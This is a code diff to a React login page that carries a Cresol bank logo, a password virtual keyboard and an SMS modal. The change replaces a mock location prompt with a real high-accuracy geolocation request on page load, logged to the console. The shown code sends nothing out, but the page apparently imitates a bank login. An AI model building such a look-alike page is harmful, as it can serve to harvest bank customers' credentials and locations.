@@ -1,9 +1,8 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
-import { LocationPermissionPrompt } from "@/components/LocationPermissionPrompt";
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
 import { Switch } from "@/components/ui/switch";
 import {
@@ -35,12 +34,43 @@ const Index = () => {
   const [showSmsModal, setShowSmsModal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
 
-  // ---- Popup de permissão de localização ----
-  const [showLocationPrompt, setShowLocationPrompt] = useState(true);
-
-  const handleAcceptLocation = () => setShowLocationPrompt(false);
-  const handleAllowOnce = () => setShowLocationPrompt(false);
-  const handleNeverAllow = () => setShowLocationPrompt(false);
+  // ---- Geolocalização nativa do navegador ----
+  useEffect(() => {
+    // Solicita permissão de geolocalização quando a página carregar
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          console.log("Usuário permitiu geolocalização:", position.coords);
+          console.log("Latitude:", position.coords.latitude);
+          console.log("Longitude:", position.coords.longitude);
+        },
+        (error) => {
+          console.log("Usuário recusou ou erro na geolocalização:", error.message);
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              console.log("Usuário negou a solicitação de geolocalização.");
+              break;
+            case error.POSITION_UNAVAILABLE:
+              console.log("Informações de localização não estão disponíveis.");
+              break;
+            case error.TIMEOUT:
+              console.log("A solicitação de localização expirou.");
+              break;
+            default:
+              console.log("Erro desconhecido na geolocalização.");
+              break;
+          }
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        }
+      );
+    } else {
+      console.log("Geolocalização não é suportada por este navegador.");
+    }
+  }, []);
 
   // ---- Teclado Inline ----
   const [showPasswordKeyboard, setShowPasswordKeyboard] = useState(false);
@@ -202,19 +232,8 @@ const Index = () => {
     }
   };
 
-  // Supondo que o header/flutuante da sua aplicação tenha cerca de 16px de altura (ajuste conforme necessário)
-  const locationPromptOffset = 16;
-
   return (
     <div className="min-h-screen flex bg-[#fff]">
-      <LocationPermissionPrompt
-        open={showLocationPrompt}
-        onAccept={handleAcceptLocation}
-        onAllowOnce={handleAllowOnce}
-        onNeverAllow={handleNeverAllow}
-        topOffset={locationPromptOffset}
-      />
-      
       {/* Modal SMS */}
       <Dialog open={showSmsModal} onOpenChange={setShowSmsModal}>
         <DialogContent className="sm:max-w-md">
